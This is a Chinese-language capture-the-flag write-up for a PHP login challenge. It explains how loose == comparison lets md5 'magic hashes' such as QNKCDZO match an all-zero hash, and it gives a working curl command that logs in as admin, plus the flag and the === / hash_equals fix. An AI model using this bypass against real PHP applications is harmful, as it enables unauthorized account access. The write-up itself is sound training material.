# PHM #28 Web — login as admin 7

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 90 |

## 題目

> 連結: [`/login7/`](https://ctf.hackme.quest/login7/)

## 分析

```php
if($_POST['name'] == 'admin' && md5($_POST['password']) == '00000000000000000000000000000000') {
    // admin account is disabled by give a impossible md5 hash
    $user = 'admin';
}
```

註解寫「不可能的 md5」, 但 PHP `==` loose compare 把兩邊都當 numeric:
- `"00000000000000000000000000000000"` → 數值 0
- 如果 `md5($password)` 格式是 `0e[大段純數字]` → 被當 scientific notation → 數值 0

→ 兩邊都 0, `0 == 0` → true, 繞過!

著名的 **magic md5** 字串:
- `QNKCDZO` → `0e830400451993494058024219903391` (開頭 `0e` + 全數字)
- `240610708` → `0e462097431906509019562988736854`

## 解法

```bash
curl 'https://ctf.hackme.quest/login7/' \
  --data-urlencode 'name=admin' \
  --data-urlencode 'password=QNKCDZO'
```

## Flag

```
FLAG{Scientific notation is awesome!!!}
```

## 感想

PHP `==` 的名場面: 兩個字串長得完全不一樣 (`"QNKCDZO"` 的 md5 vs `"00000..."`), 但都被 cast 成 number 0 就相等. 修法: 一律 `===` + `hash_equals()`.

這題跟 #25 login3 都是 loose compare bypass, 不同的是:
- #25 用 `string != true` → `false` (bool coercion)
- #28 用 `"0e..." == "0..."` → `true` (number coercion)

兩種 cast 方向都能繞.
